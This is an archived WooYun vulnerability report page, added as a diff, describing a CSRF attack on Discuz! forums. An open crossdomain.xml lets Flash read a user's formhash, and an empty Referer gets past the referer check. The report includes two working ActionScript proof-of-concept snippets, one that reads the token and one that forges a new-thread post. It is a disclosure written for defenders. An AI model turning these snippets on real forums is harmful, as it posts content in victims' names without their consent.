@@ -1,0 +1,233 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Discuz!配置不当可导致CSRF发帖  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Discuz!配置不当可导致CSRF发帖  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/p.z">p.z</a> 
+</li><li>提交时间：		2013-09-28 14:01</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-09-28：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-10-08：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">Discuz!配置不当可导致CSRF发帖</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">这个漏洞中评论说的 <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-038411">WooYun: Discuz!全版本鸡肋CSRF漏洞一枚</a> ，由于crossdomain.xml配置不当，可能会导致一些问题。评论时只是有个基本的印象，没有实测，既然xsser说有对这个的防御，那来看看是怎么防的.<br />
+<br />
+<br />
+<br />
+crossdomain.xml的默认设置：<br />
+<br />
+</p><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;<br />
+&lt;cross-domain-policy&gt;<br />
+  &lt;allow-access-from domain=&quot;*&quot; /&gt;<br />
+&lt;/cross-domain-policy&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+对dz的代码结构不熟，按黑盒来测。<br />
+<br />
+首先是读取那个formhash，看来有了crossdomain.xml的帮助，很容易的读到了当前用户的formhash。<br />
+<br />
+</p><p class="detail"><a href="../images/28135012263cb454c32c191321f8186e093348f4.png" target="_blank"><img src="../images/28135012263cb454c32c191321f8186e093348f4.png" alt="8.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><pre><code>function gethash() {<br />
+    function getformhash(txt) {<br />
+        txt = txt.split(&#039;action=logout&amp;amp;formhash=&#039;)[1].split(&#039;&quot;&#039;)[0];<br />
+        return txt;<br />
+    }<br />
+    var result_lv:LoadVars = new LoadVars();<br />
+    result_lv.onData = function(txt) {<br />
+        if (txt) {<br />
+            txt = getformhash(txt);<br />
+        } else {<br />
+            txt = &quot;Error connecting to server.&quot;;<br />
+        }<br />
+        trace(txt);<br />
+    };<br />
+    var send_lv:LoadVars = new LoadVars();<br />
+    method = &#039;GET&#039;;<br />
+    url = &quot;http://localhost:8080/&quot;;<br />
+    send_lv.sendAndLoad(url,result_lv,method);<br />
+}<br />
+gethash()</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+然后是CSRF发帖，先构造个表单，提交，发现有对refer进行检查。<br />
+<br />
+</p><p class="detail"><a href="../images/28135305dc846b21d89f3c29b00fceacc6e96624.png" target="_blank"><img src="../images/28135305dc846b21d89f3c29b00fceacc6e96624.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+哦？那截包试试空refer，发现成功了<br />
+<br />
+</p><p class="detail"><a href="../images/28135523be4f23fd0b57c5b2bd4ba1b4155f6080.png" target="_blank"><img src="../images/28135523be4f23fd0b57c5b2bd4ba1b4155f6080.png" alt="Q截图-20130928135512.png" width="600"/></a></p><p class="detail"><br />
+<br />
+那就瞎了，https到http的请求是不带refer,可以通过这办法绕过，估计用https架设论坛的没有几个吧，基本全是http的。<br />
+<br />
+<br />
+<br />
+</p><pre><code>function dopost() {<br />
+    var result_lv:LoadVars = new LoadVars();<br />
+    result_lv.onData = function(txt) {<br />
+        trace(txt);<br />
+    };<br />
+    var send_lv:LoadVars = new LoadVars();<br />
+    method = &#039;post&#039;;<br />
+    url = &quot;http://localhost:8080/forum.php?mod=post&amp;action=newthread&amp;fid=2&amp;extra=&amp;topicsubmit=yes&quot;;<br />
+    send_lv[&#039;formhash&#039;]=&#039;{{ form_hash }}&#039;<br />
+    send_lv[&#039;posttime&#039;]=&#039;1380343694&#039;<br />
+    send_lv[&#039;wysiwyg&#039;]=&#039;1&#039;<br />
+    send_lv[&#039;subject&#039;]=&#039;111&#039;<br />
+    send_lv[&#039;message&#039;]=&#039;123123213213131313&#039;<br />
+    send_lv[&#039;price&#039;]=&#039;&#039;<br />
+    send_lv[&#039;allownoticeauthor&#039;]=&#039;1&#039;<br />
+    send_lv[&#039;addfeed&#039;]=&#039;1&#039;<br />
+    send_lv[&#039;save&#039;]=&#039;&#039;<br />
+    send_lv[&#039;connect_publish_t&#039;]=&#039;0&#039;<br />
+    send_lv.sendAndLoad(url,result_lv,method);<br />
+}<br />
+dopost()</code></pre><p class='detail'> </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">李菊福,不信？您找个https试试。 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们做个调查，到底那个crossdomain.xml有没有用，没用就撤了吧。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/p.z" title="p.z">p.z</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-038429" title="Discuz!配置不当可导致CSRF发帖">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：无影响厂商忽略</p>
+													<p class="detail">忽略时间：2013-09-28 14:01</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail"></p>
+											
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="38429";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
